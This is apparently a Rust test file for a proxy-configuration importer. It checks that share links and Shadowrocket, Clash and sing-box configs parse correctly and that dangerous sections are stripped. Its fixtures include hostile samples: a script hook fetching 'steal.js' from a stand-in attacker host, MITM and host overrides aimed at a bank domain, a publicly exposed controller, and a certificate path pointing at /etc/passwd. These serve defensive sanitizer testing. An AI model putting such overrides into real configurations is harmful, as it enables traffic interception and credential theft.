use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use maxq_core_model::{
    HostClassification, Hysteria2Obfs, ImportFormat, ProtocolConfig, RuleAction, RuleMatch,
    TlsVerifyMode, TransportConfig,
};
use maxq_parser::parse_input;
use maxq_sanitizer::{apply_approved_host_aliases, sanitize_import};

#[test]
fn parses_shadowrocket_trojan_dialect_with_peer_allow_insecure_and_emoji() {
    // Redacted structural equivalent of a real Shadowrocket trojan:// export
    let link = "trojan://00000000-0000-4000-8000-000000000001@edge-sh.example.net:8205?allowInsecure=1&peer=cos.ap-guangzhou.example.com#%F0%9F%87%AF%F0%9F%87%B5%20JPN%20%E6%97%A5%E6%9C%AC%2005-4";
    let raw = parse_input(link).expect("should parse shadowrocket trojan link");
    assert_eq!(raw.format_detected, ImportFormat::ShareLinks);
    assert_eq!(raw.nodes.len(), 1);

    let sanitized = sanitize_import(raw);
    let node = &sanitized.nodes[0];
    assert_eq!(node.name, "🇯🇵 JPN 日本 05-4");
    assert_eq!(node.server, "edge-sh.example.net");
    assert_eq!(node.server_port, 8205);
    assert!(node.tls.enabled);
    assert_eq!(
        node.tls.server_name.as_deref(),
        Some("cos.ap-guangzhou.example.com")
    );
    assert_eq!(
        node.tls.verify_mode,
        TlsVerifyMode::InsecureLegacy {
            user_confirmed_override: false
        }
    );
    assert_eq!(sanitized.report.insecure_nodes_count, 1);
    assert!(matches!(
        &node.protocol,
        ProtocolConfig::Trojan { password } if password == "00000000-0000-4000-8000-000000000001"
    ));
}

#[test]
fn parses_all_modern_direct_and_legacy_protocols() {
    let sample_cert_hex = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90";
    let sr_vmess_creds = STANDARD.encode("auto:11111111-1111-4111-8111-111111111111@vmess.example.com:443");
    let ss_creds = STANDARD.encode("2022-blake3-aes-128-gcm:secret-ss-key");

    let bundle_text = format!(
        "\
anytls://my%40pass@anytls.example.com:443?peer=cdn.example.com&insecure=1&alpn=h2%2Chttp%2F1.1#AnyTLS-Node
hy2://hy2pass@hy2.example.com:443?obfs=salamander&obfs-password=sal-secret-123&mport=20000-30000,40000-45000&sni=edge.example.com&pinSHA256={sample_cert_hex}#Hy2-Node
tuic://22222222-2222-4222-8222-222222222222:tuicpass@tuic.example.com:8443?congestion_control=bbr&udp_relay_mode=native&alpn=h3&sni=tuic-sni.example.com&allow_insecure=1#TUIC-Node
vless://33333333-3333-4333-8333-333333333333@reality.example.com:443?security=reality&flow=xtls-rprx-vision&pbk=TEST_PUBLIC_KEY_12345&sid=0123abcd&sni=www.example.org&fp=chrome#VLESS-Reality
vless://44444444-4444-4444-8444-444444444444@pcs.example.com:443?security=tls&type=ws&path=%2Fws&host=ws.example.com&pcs={sample_cert_hex}&vcn=ws.example.com#VLESS-PCS
vmess://{sr_vmess_creds}?remarks=SR-VMess&obfs=websocket&path=/v2&obfsParam=cdn-ws.example.com&tls=1&peer=cdn-ws.example.com&allowInsecure=1&alterId=0
ss://{ss_creds}@ss.example.com:8388?tfo=1#SS-2022
"
    );

    // Also verify Base64 subscription wrapping
    let b64_sub = STANDARD.encode(&bundle_text);
    let raw = parse_input(&b64_sub).expect("should parse base64 bundle");
    assert_eq!(raw.format_detected, ImportFormat::Base64ShareLinks);
    assert_eq!(raw.nodes.len(), 7);

    let sanitized = sanitize_import(raw);
    assert_eq!(sanitized.nodes.len(), 7);

    // 1. AnyTLS
    assert!(matches!(
        &sanitized.nodes[0].protocol,
        ProtocolConfig::AnyTls { password, .. } if password == "my@pass"
    ));
    assert_eq!(sanitized.nodes[0].tls.alpn, vec!["h2", "http/1.1"]);

    // 2. Hysteria2 with Salamander + mport + pinSHA256
    match &sanitized.nodes[1].protocol {
        ProtocolConfig::Hysteria2 {
            server_ports, obfs, ..
        } => {
            assert_eq!(server_ports, &vec!["20000:30000", "40000:45000"]);
            assert_eq!(
                obfs,
                &Some(Hysteria2Obfs::Salamander {
                    password: "sal-secret-123".into()
                })
            );
        }
        other => panic!("expected Hysteria2, got {other:?}"),
    }
    assert_eq!(
        sanitized.nodes[1].tls.verify_mode,
        TlsVerifyMode::PendingPinBootstrap
    );
    assert_eq!(
        sanitized.nodes[1].tls.imported_cert_sha256_hex.as_deref(),
        Some(sample_cert_hex)
    );

    // 3. TUIC
    assert!(matches!(
        &sanitized.nodes[2].protocol,
        ProtocolConfig::Tuic {
            congestion_control: Some(cc),
            udp_relay_mode: Some(mode),
            ..
        } if cc == "bbr" && mode == "native"
    ));

    // 4. VLESS + Reality
    assert!(sanitized.nodes[3].tls.reality.is_some());
    assert_eq!(sanitized.nodes[3].tls.verify_mode, TlsVerifyMode::SystemCa);

    // 5. VLESS + PCS + VCN + WS
    assert_eq!(
        sanitized.nodes[4].tls.verify_mode,
        TlsVerifyMode::PendingPinBootstrap
    );
    assert_eq!(
        sanitized.nodes[4].tls.verify_peer_name.as_deref(),
        Some("ws.example.com")
    );
    assert!(matches!(
        &sanitized.nodes[4].transport,
        TransportConfig::Ws { path, .. } if path == "/ws"
    ));

    // 6. Shadowrocket VMess URI dialect
    assert_eq!(sanitized.nodes[5].name, "SR-VMess");
    assert_eq!(
        sanitized.nodes[5].tls.server_name.as_deref(),
        Some("cdn-ws.example.com")
    );

    // 7. Shadowsocks
    assert!(matches!(
        &sanitized.nodes[6].protocol,
        ProtocolConfig::Shadowsocks { method, .. } if method == "2022-blake3-aes-128-gcm"
    ));
    assert!(sanitized.nodes[6].dial.tcp_fast_open);
}

#[test]
fn parses_and_sanitizes_shadowrocket_conf_with_host_aliases_and_malicious_sections() {
    let conf = r#"
# Shadowrocket: 2026-11-24 11:20:43
[General]
bypass-system = true
skip-proxy = 192.168.0.0/16, 10.0.0.0/8, localhost, *.local
tun-excluded-routes = 10.0.0.0/8, 192.168.0.0/16
dns-server = 119.29.29.29, 223.5.5.5
use-local-host-item-for-proxy = true
ipv6 = false
udp-policy-not-supported-behaviour = REJECT
update-url = https://api.example.dev/profile.conf?token=redacted

[Proxy]
Traffic: 29.81 GB / 100 GB = trojan, edge-gz.example.net, 8101, password=00000000-0000-4000-8000-000000000001, sni=cos.example.com, skip-cert-verify=true, udp-relay=true
Expire: 2026-11-01 = trojan, edge-gz.example.net, 8101, password=00000000-0000-4000-8000-000000000001, sni=cos.example.com, skip-cert-verify=true, udp-relay=true
🇭🇰 HKG 香港 01 = trojan, edge-gz.example.net, 8101, password=00000000-0000-4000-8000-000000000001, sni=cos.example.com, skip-cert-verify=true, udp-relay=true
🇸🇬 SGP 狮城 01 = anytls, edge-sg.example.net, 443, password=anytls-secret, sni=sg.example.com, skip-cert-verify=false

[Rule]
DOMAIN-SUFFIX,baidu.com,DIRECT
DOMAIN,download.jetbrains.com,DIRECT
IP-CIDR,223.255.252.0/23,DIRECT
IP-CIDR6,2001:db8::/32,PROXY,no-resolve
USER-AGENT,*YouTube*,PROXY
OR,((DOMAIN-SUFFIX,openai.com),(DOMAIN,chatgpt.com)),PROXY
GEOIP,CN,DIRECT
FINAL,PROXY

[Host]
edge-gz.example.net = edge-gz.example-cdn.net
bank.example.org = 198.51.100.42

[URL Rewrite]
^https?://(www.)?g.cn($|/.*) https://www.google.com$2 302

[MITM]
enable = true
hostname = *.bank.example.org

[Script]
evil = type=http-response,pattern=^https://.*,script-path=https://evil.example/steal.js
"#;

    let raw = parse_input(conf).expect("should parse .conf");
    assert_eq!(raw.format_detected, ImportFormat::ShadowrocketConf);
    assert_eq!(raw.nodes.len(), 4);
    assert_eq!(raw.rules.len(), 8);

    let mut sanitized = sanitize_import(raw);
    assert_eq!(sanitized.report.total_nodes_imported, 4);
    assert_eq!(sanitized.report.metadata_nodes_count, 2);
    assert_eq!(sanitized.report.insecure_nodes_count, 3);
    assert_eq!(sanitized.report.unsupported_rules_count, 1); // USER-AGENT
    assert_eq!(
        sanitized.report.stripped_sections,
        vec!["MITM", "Script", "URL Rewrite"]
    );
    assert!(sanitized.report.has_high_or_critical());
    assert!(sanitized.general.use_local_host_item_for_proxy);
    assert_eq!(sanitized.general.ipv6, Some(false));

    // Verify OR rule parsed cleanly
    assert!(matches!(
        &sanitized.rules[5].matcher,
        RuleMatch::LogicalOr(subs) if subs.len() == 2
    ));
    assert_eq!(sanitized.rules[7].matcher, RuleMatch::Final);
    assert_eq!(sanitized.rules[7].action, RuleAction::Proxy);

    // Host classification & selective alias approval
    assert_eq!(sanitized.hosts.len(), 2);
    assert_eq!(
        sanitized.hosts[0].classification,
        HostClassification::ProxyEndpointAlias
    );
    assert_eq!(
        sanitized.hosts[1].classification,
        HostClassification::ThirdPartyDomainOverride
    );

    // Approve only the proxy endpoint alias
    sanitized.hosts[0].approved = true;
    let applied = apply_approved_host_aliases(&mut sanitized.nodes, &sanitized.hosts);
    assert_eq!(applied, 3); // Traffic, Expire, HKG 01 all share edge-gz.example.net
    assert_eq!(
        sanitized.nodes[2].effective_dial_server(),
        "edge-gz.example-cdn.net"
    );
    assert_eq!(
        sanitized.nodes[2].tls.server_name.as_deref(),
        Some("cos.example.com")
    );
}

#[test]
fn strips_dangerous_overrides_from_clash_yaml_and_singbox_json() {
    let evil_clash = r#"
mixed-port: 7890
allow-lan: true
external-controller: 0.0.0.0:9090
secret: attacker-secret
proxies:
  - name: "Trojan-Clash"
    type: trojan
    server: clash.example.com
    port: 443
    password: pass
    sni: sni.example.com
    skip-cert-verify: true
"#;
    let sanitized_clash = sanitize_import(parse_input(evil_clash).unwrap());
    assert_eq!(sanitized_clash.nodes.len(), 1);
    assert!(sanitized_clash.report.has_high_or_critical());
    assert!(sanitized_clash
        .report
        .findings
        .iter()
        .any(|f| f.category == "stripped_external_overrides" && f.count >= 4));

    let evil_sb = r#"{
      "inbounds": [{"type": "mixed", "listen": "0.0.0.0", "listen_port": 7890}],
      "experimental": {"clash_api": {"external_controller": "0.0.0.0:9090"}},
      "outbounds": [{
        "type": "anytls",
        "tag": "SB-AnyTLS",
        "server": "sb.example.com",
        "server_port": 443,
        "password": "pw",
        "tls": {"enabled": true, "server_name": "sb.example.com", "certificate_path": "/etc/passwd"}
      }]
    }"#;
    let sanitized_sb = sanitize_import(parse_input(evil_sb).unwrap());
    assert_eq!(sanitized_sb.nodes.len(), 1);
    assert!(sanitized_sb
        .report
        .findings
        .iter()
        .any(|f| f.category == "stripped_external_overrides" && f.count == 3));
}

#[test]
fn rejects_oversized_import_payloads() {
    let huge = "a".repeat(maxq_parser::MAX_IMPORT_BYTES + 16);
    let err = parse_input(&huge).unwrap_err();
    assert!(matches!(err, maxq_parser::ParseError::InputTooLarge { .. }));
}
